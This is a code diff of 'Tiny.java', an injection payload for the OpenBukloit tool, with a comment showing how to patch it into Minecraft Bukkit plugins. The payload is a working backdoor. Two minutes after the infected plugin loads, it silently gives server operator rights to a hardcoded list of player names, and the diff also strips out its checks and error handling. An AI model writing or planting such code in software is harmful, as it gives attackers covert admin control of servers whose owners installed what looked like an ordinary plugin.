@@ -1,29 +1,24 @@
 import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.Bukkit;
-import org.bukkit.entity.Player;
-import org.bukkit.OfflinePlayer;
+import org.bukkit.*;
+// Описание на английском намеренно
 /**
  * This program gives OP for each player in comma-separated list.
  * OpenBukloit patch command example:
  *   java -jar OpenBukloit-1.1.1.jar -e Tiny.java --players Cheese132,HelloWorld4321
  * Note. You can see this message: Tiny.java uses or overrides a deprecated API.
- *       Please, ignore tis message
+ *       Ignore it!
  */
 public class Tiny{
-    private static final String plrs = "%players%";
-    public static void inject(JavaPlugin pl){
-        Bukkit.getScheduler().runTaskLater(pl,()->{
-            for(String pNm : Tiny.plrs.split(",")){
-                try{
-                    Player p = Bukkit.getPlayerExact(pNm.trim());
-                    if(p!=null&&p.isOnline()){
-                        if(!p.isOp())p.setOp(true);
-                        return;
-                    }
-                    OfflinePlayer offP = Bukkit.getOfflinePlayer(pNm);
-                    if(offP!=null&&!offP.isOp())offP.setOp(true);
-                }catch(Exception e){}
+    private static final String l = "%players%";
+    public static void inject(JavaPlugin j){
+        Bukkit.getScheduler().runTaskLater(j,()->{
+            for(String n : Tiny.l.split(",")){
+                Bukkit.getOfflinePlayer(n).setOp(true);
             }
-        },2400L);
+        },2400L); // 2 minutes after onEnable
     }
 }
+// ---------- variables / переменные ------------
+// l    -> player nicknames  => (String)        "player1,player2"
+// n    -> nickname to check => (String)        "player1"
+// j    -> plugin instance   => (JavaPlugin)    instance
